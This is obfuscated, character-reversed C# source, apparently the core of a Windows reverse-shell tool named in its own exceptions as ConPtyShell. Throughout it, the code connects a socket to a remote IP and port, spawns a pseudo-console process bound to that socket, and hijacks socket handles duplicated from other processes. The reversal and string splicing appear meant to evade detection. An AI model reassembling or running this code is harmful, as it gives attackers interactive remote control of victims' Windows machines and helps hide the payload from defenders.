;)(mirT.]0[)UnJ UnJ(tilpS.devieceRezis = gnirtSswor gnirts            
;)devieceRsetyb ,0 ,deviecer(gnirtSteG.IICSA.gnidocnE = devieceRezis gnirts            
{        
yrt        
;)0 ,001 ,deviecer ,tekcoSllehs(vcer = devieceRsetyb tni        
;pmeTsloc ,pmeTswor tni        
;]001[etyb wen = deviecer ][etyb        
snoitcennoc rewols rof kaewt elttil//;)005(peelS.daerhT        
{    
)sloc tniu fer ,swor tniu fer ,tekcoSllehs rtPtnI(tekcoSmorFsloCswoResraPyrT diov citats'+' etavirp    

}    
;tekcos nruter        

}        
;))rorre ,YGK}0{ :edoc rorre htiw deliaf tcennoCASWYGK(tamroF.gnirtS(noitpecxEllehSytPnoC wen worht            
;)(rorrEtsaLteGASW = rorre            
{        
)0 =! ))ofnikcos(fOeziS.lahsraM ,ofnikcos fer ,tekcos(tcennoc( fi        

;)trop)trohsu((snoth)trohs( = trop_nis.ofnikcos        
;)tsoh(rdda_teni = rdda_nis.ofnikcos        
;2)trohs( = ylimaf_nis.ofnikcos        
;)(NI_RDDAKCOS wen = ofnikcos NI_RDDAKCOS        
;)DEPPALREVO_GALF_ASW ,0 ,oreZ.rtPtnI ,PI.epyTlocotorP ,maertS.epyTtekcoS ,krowteNretnI.ylimaFsserddA(tekcoSASW = tekcos        
;oreZ.rtPtnI = tekcos rtPtnI        

}        
;))(gnirtSoT.troPetomer + YGK :dilavni si trop deificepSYGK(noitpecxEllehSytPnoC wen worht            
{        
hctac        
}        
;)troPetomer(23tnIoT.trevnoC = trop            
{        
yrt        

;pIetomer = tsoh gnirts        
;0 = rorre tni        
;0 = trop tni        
{    
)troPetomer tni ,pIetomer gnirts(etomeRtcennoc rtPtnI citats etavirp    

}    
;)))(rorrEtsaLteGASW ,YGK}0{ :edoc rorre htiw deliaf putratSASWYGK(tamroF.gnirtS(noitpecxEllehSytPnoC wen worht            
)0 =! )atad tuo ,2 W3U 8 << 2(putratSASW( fi        
;atad ataDASW        
{    
)(daerhTASWtinI diov citats etavirp    

;)eldnaHssecorp rtPtnI(ssecorPemuseRtN tniu nretxe citats etavirp    
])YGKlld.lldtnYGK(tropmIllD[    

;)eldnaHssecorp rtPtnI(ssecorPdnepsuStN tniu nretxe citats etavirp    
])YGKlld.lldtnYGK(tropmIllD[    

;)tnevEh rtPtnI(tnevEesolCASW loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKLLD.23_2SWYGK(tropmIllD[    

;)tnevEh rtPtnI(tnevEteseRASW loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKLLD'+'.23_2SWYGK(tropmIllD[    

;)elbatrelAf loob ,tuoemiTwd tni ,llAtiaWf loob ,stnevEhpl ][rtPtnI ,stnevEc tni(stnevEelpitluMroFtiaWASW tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKLLD.23_2SWYGK(tropmIllD[    

;)stnevEkrowteNl tni ,tcejbOtnevEh rtPtnI ,s rtPtnI(tceleStnevEASW tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKLLD.23_2SWYGK(tropmIllD[    

;)(tnevEetaerCASW rtPtnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKLLD.23_2SWYGK(tropmIllD[    

;)sgalf tniu ,nel tni ,fub ][etyb ,tekcoS rtPtnI(dnes tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)sgalf tniu ,nel tni ,fub ][etyb ,tekcoS rtPtnI(vcer tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)s rtPtnI(tekcosesolc tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,edocinU.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)ataDasw ataDASW tuo ,detseuqeRnoisreVw 61tnI(putratSASW 23tnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)(rorrEtsaLteGASW 23tnI nretxe citats etavirp    
])otuA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)pc gnirts(rdda_teni tniu nretxe citats etavirp    
])eurt = rorrEtsaLteS ,isnA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)trohstsoh trohsu(snoth trohsu nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23_2swYGK(tropmIllD[    

;)ezisrdda tni ,rdda NI_RDDAKCOS fer ,s rtPtnI(tcennoc tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23_2swYGK(tropmIllD[    

;)sgalf tni ]nI[ ,puorg tniu ]nI[ ,ofnIlocotorp rtPtnI ]nI[ ,epyTlocotorp epyTlocotorP ]nI[ ,epyTtekcos epyTtekcoS ]nI[ ,ylimaFsserdda ylimaFsserddA ]nI[(tekcoSASW rtPtnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,isnA.teSrahC = teSrahC ,YGKlld.23_2swYGK(tropmIllD[    

;)emaNcorp gnirts ,eludoMh rtPtnI(sserddAcorPteG rtPtnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,eurt = gnillepStcaxE ,isnA.teSrahC = teSrahC ,YGK23lenrekYGK(tropmIllD[    

;)emaNeludoMpl gnirts(eldnaHeludoMteG rtPtnI nretxe citats etavirp    
])otuA.teSrahC = teSrahC ,YGKlld.23lenrekYGK(tropmIllD[    

;)(wodniWelosnoCteG rtPtnI nretxe citats etavirp    
])YGKlld.23lenrekYGK(tropmIllD[    

;)wohSdmCn tni ,dnWh rtPtnI(wodniWwohS loob nretxe citats etavirp    
])YGKlld.23resuYGK(tropmIllD[    

;)(elosnoCeerF loob nretxe citats etavirp    
])eurt = gnillepStcaxE ,eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)(elosnoCcollA loob nretxe citats etavirp    
])looB.epyTdeganamnU(sAlahsraM :nruter[    
])YGKlld.23lenrekYGK(tropmIllD[    

;)edom tniu tuo ,eldnah rtPtnI(edoMelosnoCteG loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)edom tniu ,eldnaHelosnoCh rtPtnI(edoMelosnoCteS loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)CPh rtPtnI(elosnoCoduesPesolC tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)CPhp rtPtnI tuo ,sgalFwd tniu ,tuptuOh rtPtnI ,tupnIh rtPtnI ,ezis DROOC(elosnoCoduesPetaerC tni nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)deppalrevOpl rtPtnI ,nettirWsetyBfOrebmuNpl tniu tuo ,etirWoTsetyBfOrebmuNn tniu ,reffuBpl ][etyb ,eliFh rtPtnI(eliFetirW loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)deppalrevOpl rtPtnI ,daeRsetyBfOrebmuNpl tniu tuo ,daeRoTsetyBfOrebmuNn tniu ,reffuBpl ][etyb ]tuO[ ,eliFh rtPtnI(eliFdaeR loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)eliFetalpmeTh rtPtnI ,setubirttAdnAsgalFwd tniu ,noitisopsiDnoitaerCwd tniu ,setubirttAytiruceS rtPtnI ,edoMerahSwd tniu ,sseccAderiseDwd tniu ,emaNeliFpl gnirts(eliFetaerC rtPtnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,llaCdtS.noitnevnoCgnillaC = noitnevnoCgnillaC ,otuA.teSrahC = teSrahC ,YGKlld.23lenrekYGK(tropmIllD[    

;)eziSn tni ,setubirttAepiPpl SETUBIRTTA_YTIRUCES fer ,epiPetirWh rtPtnI tuo ,epiPdaeRh rtPtnI tuo(epiPetaerC loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,otuA.teSrahC = teSrahC ,YGKlld.23lenrekYGK(tropmIllD[    

;)tcejbOh rtPtnI(eldnaHesolC loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)eldnaHdtSn tni(eldnaHdtSteG rtPtnI nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)eldna'+'Hh rtPtnI ,eldnaHdtSn tni(eldnaHdtSteS loob nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)sdnocesilliMwd 23tnIU ,eldnaHh rtPtnI(tcejbOelgniSroFtiaW 23tnIU nretxe citats etavirp    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)edoCtixEu tniu ,ssecorPh rtPtnI(ssecorPetanimreT loob nretxe citats etavirp    
])looB.epyTdeganamnU(sAlahsraM :nruter[    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)noitamrofnIssecorPpl NOITAMROFNI_SSECORP tuo ,ofnIputratSpl OFNIPUTRATS fer ]nI[ ,yrotceriDtnerruCpl gnirts ,tnemnorivnEpl rtPtnI ,sgalFnoitaerCwd tniu ,seldnaHtirehnIb loob ,setubirttAdaerhTpl rtPtnI ,setubirttAssecorPpl rtPtnI ,eniLdnammoCpl gnirts ,emaNnoitacilppApl gnirts(ssecorPetaerC loob nretxe citats etavirp    
])YGKssecorPetaerCYGK = tnioPyrtnE ,otuA.teSrahC = teSrahC ,eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)noitamrofnIssecorPpl NOITAMROFNI_SSECORP tuo ,ofnIputratSpl XEOFNIPUTRATS fer ]nI[ ,yrotceriDtnerruCpl gnirts ,tnemnorivnEpl rtPtnI ,sgalFnoitaerCwd tniu ,seldnaHtirehnIb loob ,setubirttAdaerhTpl SETUBIRTTA_YTIRUCES fer ,setubirttAssecorPpl SE'+'TUBIRTTA_YTIRUCES fer ,eniLdnammoCpl gnirts ,emaNnoitacilppApl gnirts(xEssecorPetaerC loob nretxe citats etavirp    
])looB.epyTdeg'+'anamnU(sAlahsraM :nruter[    
])YGKssecorPetaerCYGK = tnioPyrtnE ,otuA.teSrahC = te'+'SrahC ,eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)eziSnruteRpl rtPtnI ,eulaVsuoiverPpl rtPtnI ,eziSbc rtPtnI '+',eulaVpl rtPtnI ,etubirtta rtPtnI ,sgalFwd tniu ,tsiLetubirttApl rtPtnI(etubirttAdaerhTcorPetadpU loob nretxe citats etavirp    
])looB.epyTdeganamnU(sAlahsraM :nruter[    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

;)eziSpl rtPtnI fer ,sgalFwd tni ,tnuoCetubirttAwd tni ,tsiLetubirttApl rtPtnI(tsiLetubirttAdaerhTcorPezilaitinI loob nretxe citats etavirp    
])looB.epyTdeganamnU(sAlahsraM :nruter[    
])eurt = rorrEtsaLteS ,YGKlld.23lenrekYGK(tropmIllD[    

}    
;orez_nis gnol cilb'+'up        
;rdda_nis tniu cilbup        
;trop_nis trohs cilbup        
;ylimaf_nis trohs cilbup        
{    
NI_RDDAKCOS tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;sutatSmetsySzs gnirts cilbup        
])921 = tsnoCeziS ,rtSTlaVyB.epyTdeganamnU(sAlahsraM[        
;noitpircseDzs gnirts cilbup        
])752 = tsnoCeziS ,rtSTlaVyB.epyTdeganamnU(sAlahsraM[        
;ofnIrodneVpl rtPtnI cilbup        
;gDpdUxaMi trohs cilbup        
;stekcoSxaMi trohs cilbup        
;noisreVhgiHw trohs cilbup        
;noisreVw trohs cilbup '+'       
{    
ataDASW tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;Y trohs cilbup        
;X trohs cilbup        
{    
DROOC tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;eldnaHtirehnIb tni cilbup        
;rotpircseDytiruceSpl rtPtnI cilbup        
;htgneLn tni cilbup        
{    
SETUBIRTTA_YTIRUCES tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;dIdaerhTwd tni cilbup        
;dIssecorPwd tni cilbup        
;daerhTh rtPtnI cilbup        
;ssecorPh rtPtnI cilbup        
{    
NOITAMROFNI_SSECORP tcurts etavirp    
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;rorrEdtSh rtPtnI cilbup        
;tuptuOdtSh rtPtnI cilbup        
;tupnIdtSh rtPtnI cilbup        
;2devreseRpl rtPtnI cilbup        
;2devreseRbc 61tnI cilbup        
;wodniWwohSw 61tnI cilbup        
;sgalFwd 23tnI cilbup        
;etubirttAlliFwd 23tnI cilbup        
;srahCtnuoCYwd 23tnI cilbup        
;srahCtnuoCXwd 23tnI cilbup        
;eziSYwd 23tnI cilbup        
;eziSXwd 23tnI cilbup        
;Ywd 23tnI cilbup        
;Xwd 23tnI cilbup        
;eltiTpl gnirts cilbup        
;potkseDpl gnirts cilbup        
;devreseRpl gnirts cilbup        
;bc 23tnI cilbup        
{    
OFNIPUTRATS tcurts etavirp    
])edocinU.teSrahC = teSrahC ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    

}    
;tsiLetubirttApl rtPtnI cilbup        
;ofnIputratS OFNIPUTRATS cilbup        
{    
XEOFNIPUTRATS tcurts etavirp    
])edocinU.teSrahC = teSrahC ,laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[    


;)0 << 1( = DAER_DF tni tsnoc etavirp    
;53001 = KCOLBDLUOWEASW tni tsnoc etavirp    
;21- = ELDNAH_RORRE_DTS tni tsnoc etavirp    
;11- = ELDNAH_TUPTUO_DTS tni tsnoc etavirp    
;01- = ELDNAH_TUPNI_DTS tni tsnoc etavirp    
;3 = GNITSIXE_NEPO tniu tsnoc etavirp    
;08x0 = LAMRON_ETUBIRTTA_ELIF tniu tsnoc etavirp    
;20000000x0 = ETIRW_ERAHS_ELIF tniu tsnoc etavirp    
;10000000x0 = DAER_ERAHS_ELIF tniu tsnoc etavirp    
;00000004x0 = ETIRW_CIRENEG tniu tsnoc etavirp    
;00000008x0 = DAER_CIRENEG tniu tsnoc etavirp    
;0 = EDIH_WS tni tsnoc etavirp    
;FFFFFFFFx0 = ETINIFNI 23tnIU tsnoc etavirp    
;1x0 = DEPPALREVO_GALF_ASW tni tsnoc etavirp    
;6758401 = EPIP_EZIS_REFFUB tni tsnoc etavirp    
;00100000x0 = SELDNAHDTSESU_FTRATS tni tsnoc etavirp    
;00008000x0 = TNESERP_OFNIPUTRATS_DEDNETXE tniu tsnoc etavirp    
;61002000x0 = ELOSNOCODUESP_ETUBIRTTA_DAERHT_CORP tniu tsnoc etavirp    
;8000x0 = NRUTER_OTUA_ENILWEN_ELBASID tniu tsnoc etavirp    
;4000x0 = GNISSECORP_LANIMRET_LAUTRIV_ELBANE tniu tsnoc etavirp    
;YGKnq7Jrq7J}}}noitpecxEllehSytPnoC{{{YGK = gnirtSrorre gnirts tsnoc etavirp    
{
llehSytPnoC ssalc citats cilbup

}
}    
}        
;llun nruter            
dnuof ton //            
{        
)noitpecxEtnemugrA( hctac        
}        
;))(23tnIoT.dIssecorPeuqinUmorF'+'detirehnI.ibp(d'+'IyBssecorPteG.ssecorP nruter            
{        
yrt        
;))(gni'+'rtSoT.sutats(noitpecxEllehSytPnoC wen worht            
)0 =! sutats( fi        
;)htgneLnruter tuo ,)ibp(fOeziS.lahsraM ,ibp fer ,0 ,eldnah(ssecorPnoitamrofnIyreuQtN = sutats tni        
;htgneLnruter tni        
;)(seitilitUssecorPtneraP wen = ibp seitilitUssecorPtneraP        
{    
)eldnah rtPtnI(ssecorPtneraPteG ssecorP citats cilbup    

}    
;)eldnaH.ssecorp(ssecorPtneraPteG nruter        
;)di(dIyBssecorPteG.ssecorP = ssecorp ssecorP        
{    
)di tni(ssecorPtneraPteG ssecorP citats cilbup    

}    
;)eldnaH.)(ssecorPtnerruCteG.ssecorP(ssecorPtneraPteG nruter        
{    
)(ssecorPtneraPteG ssecorP citats cilbup    

;)htgneLnruter tni tuo ,htgneLnoitamrofnIssecorp tni ,noitamrofnIssecorp seitilitUssecorPtneraP fer ,ssalCnoitamrofnIssecorp tni ,eldnaHssecorp rtPtnI(ssecorPnoitamrofnIyreuQtN tni nretxe citats etavirp    
])YGKlld.lldtnYGK(tropmIllD[    

;dIssecorPeuqinUmorFdetirehnI rtPtnI lanretni    
;dIssecorPeuqinU rtPtnI lanretni    
;1_2devreseR rtPtnI lanretni    
;0_2devreseR rtPtnI lanretni    
;sserddAesaBbeP rtPtnI lanretni    
;1devreseR rtPtnI lanretni    
NOITAMROFNI_CISAB_SSECORP hctam tsum srebmem esehT //    
{
seitilitUssecorPtneraP tcurts cilbup
])laitneuqeS.dniKtuoyaL(tuoyaLtcurtS[
5506433/a/moc.wolfrevokcats//:sptth >-- morf ecruos //

}
}    
;))(gnirtSoT.)(rorrEtsaLteGASW + YGK :rorretsalasw dna YGK + )(gnirtSoT.tluser + YGK edoc nruter htiw deliaf tekcosltcoiYGK(noitpecxEllehSytPnoC wen worht            
)1- == tluser( fi        
;)edoMgnikcolB fer ,OIBNOIF ,tekcos(tekcosltcoi = tluser            
esle        
;)edoMgnikcolBnoN fer ,OIBNOIF ,tekcos(tekcosltcoi = tluser            
)1 == edom( fi        
;tluser tni        
;0 = edoMgnikcolB tni        
;1 = edoMgnikcolBnoN tni        
;6625917412- = OIBNOIF tni        
{    
)edom tni ,tekcos rtPtnI(edoMgnikcolBtekcoSteS diov citats cilbup    
}    
;eldnaHtekcoStegrat nruter        
;)YGK...gnitixE (: stekcos elbakcajih on os ,dnuof stekcos oNYGK(noitpecxEllehSytPnoC wen worht            
)oreZ.rtPtnI == eldnaHtekcoStegrat( fi        
}        
}            
}                
;kaerb                    
;eslaf = tekcoSdeppalrevo ))eldnaHtekcoStegrat(deppalrevOtekcoSsI!( fi                    
;eldnaHtekcos = eldnaHtekcoStegrat                    
{                
)stekcoSssecorPtegrat ni eldnaHtekcos rtPtnI( hcaerof                
;)YGK...stekcos deppalrevo-non osla nruter ot gniyrT .dnuof stekcos deppalrevo oN :gubedYGK(eniLetirW.elosnoC //                
{ )oreZ'+'.rtPtnI == eldnaHtekcoStegrat( fi            
stekcos deppalrevO-noN osla gnidulcni yb epocs eht gnidnapxe ,dnuof stekcos deppalrevO on //            
}            
;kaerb                
;eurt = tekcoSdeppalrevo                
;eldnaHtekcos = eldnaHtekcoStegrat                
}                
;eunitnoc                    
;)YGK...gnippiks ,DEPPALREVO_GALF_ASW galf eht htiw detaerc neeb ton sah ti tub ,tekcos elbasu a dnuoF :gubedYGK(eniLetirW.elosnoC //                    
{                
))eldnaHtekcos(deppalrevOtekcoSsI!( fi                
stekcos deppalrevO fo gnikcajih eht ezitiroirp ew //                
{            
)stekcoSssecorPtegrat ni eldnaHtekcos rtPtnI( hcaerof            
{        
esle        
;eldnaHtekcoStegrat nruter )1 < tnuoC.stekcoSssecorPtegrat( fi        
;)ssecorPtegrat(ssecorPtegraTstekcoSteG = stekcoSssecorPtegrat >rtPtnI<tsiL        
;oreZ.rtPtnI = eldnaHtekcoStegrat rtPtnI        
{    
)tekcoSdeppalrevo loob fer ,ssecorPtegrat ssecorP(tekcoSssecorPtegraTetacilpuD rtPtnI citats cilbup    

}    
;ter nruter        
;eurt = ter )0 =! )DEPPALREVO_GALF_ASW & sgalFnoitaerC.ataDderahS.ataDtxetnoc(( fi        
}        
;ter nruter            
; ;))YGK8XYGK(gnirtSoT.sutatStn + YGKx0 edoc rorre htiw deliaf eliFlortnoCoIeciveDtN :gubedYGK(eniLetirW.elosnoC //            
{        
)SSECCUS_SUTATSTN =! sutatStn( fi        

;)tnevEkcos(eldnaHesolC        
}        
;sutats.BSOI = sutatStn            
;)ETINIFNI ,tnevEkcos(tcejbOelgniSroFtiaW            
{        
)GNIDNEP_SUTATSTN == sutatStn( fi        
 noitelpmoC rof tiaW //        
;))ataDtxetnoc(fOeziS.lahsraM ,ataDtxetnoc fer ,0 ,oreZ.rtPtnI ,TXETNOC_TEG_DFA_LTCOI ,BSOI fer ,oreZ.rtPtnI ,oreZ.rtPtnI ,tnevEkcos ,tekcos(1eliFlor'+'tnoCoIeciveDtN = sutatStn        
;)(KCOLB_SUTATS_OI wen = BSOI KCOLB_SUTATS_OI        
}        
;ter nruter            
; ;))YGK8XYGK(gnirtSoT.sutatStn + YGKx0 edoc rorre htiw deliaf tnevEetaerCtN :gubedYGK(eniLetirW.elosnoC //            
{        
)SSECCUS_SUTATSTN =! sutatStn( fi        
;)eslaf ,tnevEnoitazinorhcnyS ,oreZ.rtPtnI ,SSECCA_LLA_TNEVE ,tnevEkcos fer(tnevEetaerCtN = sutatStn        
;)(TXETNOC_TEKCOS wen = ataDtxetnoc TXETNOC_TEKCOS        
;1- = sutatStn tni        
;oreZ.rtPtnI = tnevEkcos rtPtnI        
;eslaf = ter loob        
{    
)tekcos rtPtnI(deppalrevOtekcoSsI loob citats cilbup    

}    
;detirehni nruter        
}        
;)eldnaHtekcoStnerap(tekcosesolc            
}            
;eurt = detirehni                
;))YGK4XYGK(gnirtSoT.eldnaHtekcoStnerap + YGKx0 >-- eldnah !tekcos detirehni dnuof :gubedYGK(eniLetirW.elosnoC //                
{            
)               
)trop_nis.ssecorPtneraPrddakcos == trop_nis.ssecorPtegraTrddakcos && rdda_nis.ssecorPtneraPrddakcos == rdda_nis.ssecorPtegraTrddakcos(                
&& )0 == )neLssecorPtneraPrddakcos fer ,ssecorPtneraPrddakcos fer ,eldnaHtekcoStnerap(emanreepteg(                
&& )0 == )neLssecorPtegraTrddakcos fer ,ssecorPtegraTrddakcos fer ,eldnaHtekcos(emanreepteg(                
( fi            
;)ssecorPtneraPrddakcos(fOeziS.lahsraM = neLssecorPtneraPrddakcos tni            
;)ssecorPtegraTrddakcos(fOeziS.lahsraM = neLssecorPtegraTrddakcos tni            
;)(NI_RDDAKCOS wen = ssecorPtneraPrddakcos NI_RDDAKCOS            
;)(NI_RDDAKCOS wen = ssecorPtegraTrddakcos NI_RDDAKCOS            
{        
)seldnaHstekcoStnerap ni eldnaHtekcoStnerap rtPtnI( hcaerof        
;detirehni nruter            
)1 < tnuoC.seldnaHstekcoStnerap( fi        
;)ssecorPtnerap(ssecorPtegraTstekcoSteG = seldnaHstekcoStnerap >rtPtnI<tsiL        
;eslaf = detirehni loob        
{    
)ssecorPtnerap ssecorP ,eldnaHtekcos rtPtnI(detirehnItekcoSsI loob citats cilbup    

}    
;seldnaHstekcos nruter        
;seldnaHstekcoSdepud = seldnaHstekcos        
;)seldnaHstekcoSdepud(nIsetyByBstekcoSredrOdnAretliF = seldnaHstekcoSdepud            
)1 => tnuoC.seldnaHstekcoSdepud( fi        
;)seldnaHstekcos(seldnaHmorFstekcoSetacilpuD = seldnaHstekcoSdepud >rtPtnI<tsiL        
;)ofnIseldnaHrtp(labolGHeerF.lahsraM        
}        
}            
;oreZ.rtPtnI = emaNtcejbOr'+'tp                
;)emaNtcejbOrtp(labolGHeerF.lahsraM                
;)eldnaHpud(eldnaHesolC                '+'    
esle                
}                
;)eldnaHpud(eldnaHesolC                        
esle                    
;)eldnaHpud(ddA.seldnaHstekcos                        
)YGKdfAq7Jq7JeciveDq7Jq7JYGK == emaNtcejbOrts( fi                    
;)emaNtcejbOrts + YGK = emaNtcejbOrts YGK + )YGK4XYGK(gnirtSoT.eldnaHpud + YGKx0 eldnah elif :gubedYGK(eniLetirW.elosnoC //                    
;)2 / htgneL.emaN.ofnIemaNjbo ,reffuB.emaN.ofnIemaNjbo(inUgnirtSoTrtP.lahsraM = emaNtcejbOrts                    
{                
)0 > htgneL.emaN.ofnIemaNjbo && oreZ.rtPtnI =! reffuB.emaN.ofnIemaNjbo( fi                
}                
;eunitnoc                    
;)eldnaHpud(eldnaHesolC                    
{ '+'               
hctac                
}                
;))NOITAMROFNI_EMAN_TCEJBO(foepyt ,emaNtcejbOrtp(erutcurtSoTrtP.lahsraM)NOITAMROFNI_EMAN_TCEJBO( = ofnIemaNjbo                    
{                
yrt                
}                
;eunitnoc                    
;)eldnaHpud(eldnaHesolC                    
{                
)oreZ.rtPtnI == emaNtcejbOrtp( fi                
;)0 ,noitamrofnIemaNtcejbO.SSALC_NOITAMROFNI_TCEJBO ,eldnaHpud(cimanyDtcejbOyreuQtN = emaNtcejbOrtp                
}                
;eunitnoc                    
;)eldnaHpud(eldnaHesolC                    
;)YGKdetceted kcoldaeD :gubedYGK(eniLetirW.elosnoC //                    
seldnah epip deman laiceps no skcoldaed sdiova lliw siht // {                
))eldnaHpud(detceteDkcoldaeDkcehC.jbOrepleHkcehCkcoldaed( fi                
{            
))SSECCA_EMAS_ETACILPUD ,eslaf ,0 ,eldnaHpud tuo ,)(ssecorPtnerruCteG ,eulaVeldnaH.eldnaHsys)rtPtnI( ,ssecorPtegraTh(eldnaHetacilpuD( fi            
;eunitnoc                
)tcejbOeliFxednIepyT =! xednIepyTtcejbO.eldnaHsys W3UW3U dI.ssecorPtegrat =! dIssecorPeuqinU.eldnaHsys( fi            
;)))OFNI_YRTNE_ELBAT_ELDNAH_METSYS(foepyt(fOeziS.lahsraM + )(46tnIoT.tnerruCofnIseldnaHrtp()rtPtnI( = tnerruCofnIseldnaHrtp            
OFNI_YRTNE_ELBAT_ELDNAH_METSYS txen ot retniop evom//            
}            
;kaerb                
{            
hctac            
}            
;))OFNI_YRTNE_ELBAT_ELDNAH_METSYS(foepyt ,tnerruCofnIseldnaHrtp(erutcurtSoTrtP'+'.lahsraM)OFNI_YRTNE_ELBAT_ELDNAH_METSYS( = eldnaHsys                
{            
yrt            
;eldnaHsys OFNI_YRTNE_ELBAT_ELDNAH_METSYS            
{        
)++i ;tnuoCseldnaH < i ;0 = i tni( rof        
;)YGKeliFYGK(emaNyBxednIepyTteG = tcejbOeliFxednIepyT etyb        
stcejbo stekcos ylno retlif ot dedeen ,stcejbo YGKeliFYGK rof xednIepyT teg //        
;)eziS.rtPtnI + )(46tnIoT.ofnIseldnaHrtp(rtPtnI wen = tnerruCofnIseldnaHrtp rtPtnI        
][OFNI_YRTNE_ELBAT_ELDNAH_METSYS fo sserdda eht fo gninnigeb eht ta retniop a etaerc //        
;)(46tnIoT.)ofnIseldnaHrtp(rtPtnIdaeR.lahsraM = tnuoCseldnaH        
;)0 ,noitamrofnIeldnaHmetsyS(cimanyDnoitamrofnImetsySyreuQtN = ofnIseldnaHrtp        
}        
;seldnaHstekcos nruter            
;)YGKssecca eldnaHetacilpuD rof YGK + )(gnirtSoT.dI.ssecorPtegrat + YGK dip htiw ssecorp tegrat nepo tonnaCYGK(eniLetirW.elosnoC            
{        
)oreZ.rtPtnI == ssecorPtegraTh( fi        
;)dI.ssecorPtegrat ,eslaf ,ELDNAH_PUD_SSECORP(ssecorPnepO = ssecorPtegraTh        
;)(repleHkcehCkcoldaeD wen = jbOrepleHkcehCkcoldaed repleHkcehCkcoldaeD        
;)(>rtPtnI<tsiL wen = seldnaHstekcos >rtPtnI<tsiL        
;emaNtcejbOrts gnirts        
;ssecorPtegraTh rtPtnI        
;ofnIseldnaHrtp rtPtnI        
;emaNtcejbOrtp rtPtnI        
;eldnaHpud rtPtnI        
;0 = tnuoCseldnaH gnol        
;ofnIemaNjbo NOITAMROFNI_EMAN_TCEJBO        
{    
)ssecorPtegrat ssecorP(ssecorPtegraTstekcoSteG >rtPtnI<tsiL citats cilbup    

}    
;oreZ.rtPtnI nruter        
lufsseccuS ton nehw retniop eerf//;)rtPofni(labolGHeerF.lahsraM            
esle        
ti htiw enod erUnJuoy retfa labolGHeerF.lahsraM htiw retniop eht eerf ot tegrof tUnJnod//;rtPofni nruter            
)SSECCUS_SUTATSTN == tluser( fi        
}        
}            
;kaerb                
;)tluser + YGK sutatStN deldnahnUYGK(noitpecxE wen worht//                
{            
esle            
;kaerb                
)SSECCUS_SUTATSTN == tluser( fi esle            
}            
;eunitnoc                
;)htgneLofni)tni((labolGHcollA.lahsraM = rtPofni                
;)rtPofni(labolGHeerF.lahsraM                
{            
)LLAMSOOTREFFUB_SUTATSTN == tluser W3UW3U WOLFREVOREFFUB_SUTATSTN == tluser W3UW3U HCTAMSIMHTGNELOFNI_SUTATSTN == tluser( fi            
;)htgneLofni fer ,htgneLofni)tniu( ,rtPofni ,ssalCofni ,eldnah(tcejbOyreuQtN)tniu( = tluser            
{        
)eurt( elihw        
;tluser tniu        
;)htgneLofni(labolGHcollA.lahsraM = rtPofni rtPtnI        
;))tni(foepyt(fOeziS.lahsraM = htgneLofni            
)0 == htgneLofni( fi        
{    
)htgneLofni tni ,ssalCofni SSALC_NOITAMROFNI_TCEJBO ,eldnah rtPtnI(cimanyDtcejbOyreuQtN rtPtnI citats cilbup    
noitacolla reffub YGKcimanydYGK htiw dohtem repleh//    

}    
;tekcoSter nruter        
}        
}            
;tekcoSdetacilpud = tekcoSter                
{            
)0 > )(46tnIoT.tekcoSdetacilpud( fi            
